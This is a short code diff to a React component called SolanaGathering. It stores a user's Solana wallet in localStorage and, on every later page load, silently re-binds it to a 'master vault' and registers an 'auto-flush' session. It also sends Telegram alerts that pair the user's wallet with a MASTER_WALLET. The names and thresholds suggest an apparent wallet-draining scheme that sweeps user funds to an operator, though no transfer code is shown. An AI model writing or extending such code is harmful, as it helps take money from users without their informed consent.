@@ -23,6 +23,14 @@ const SolanaGathering: React.FC = () => {
       minFlushAmount: 0.01,
       maxFlushAmount: 100,
     });
+
+    const saved = localStorage.getItem('sreymara_bound_wallet');
+    if (saved) {
+      setWalletAddress(saved);
+      setIsBound(true);
+      const session = SolanaAutoFlushService.registerSession('current-user', saved);
+      setSessionId(session.id);
+    }
   }, []);
 
   // 45-minute revenue pulse via Telegram alert
@@ -42,15 +50,16 @@ const SolanaGathering: React.FC = () => {
     if (!walletAddress.trim()) return;
     setIsBound(true);
     setStatus('Wallet bound to master vault');
+    localStorage.setItem('sreymara_bound_wallet', walletAddress.trim());
 
     // Register session for auto-flush
     const session = SolanaAutoFlushService.registerSession(
       'current-user',
-      walletAddress
+      walletAddress.trim()
     );
     setSessionId(session.id);
 
-    TelegramExecutiveAlertService.sendTransactionAlert('wallet_bind', 0, walletAddress, MASTER_WALLET);
+    TelegramExecutiveAlertService.sendTransactionAlert('wallet_bind', 0, walletAddress.trim(), MASTER_WALLET);
   };
 
   const simulateGather = () => {
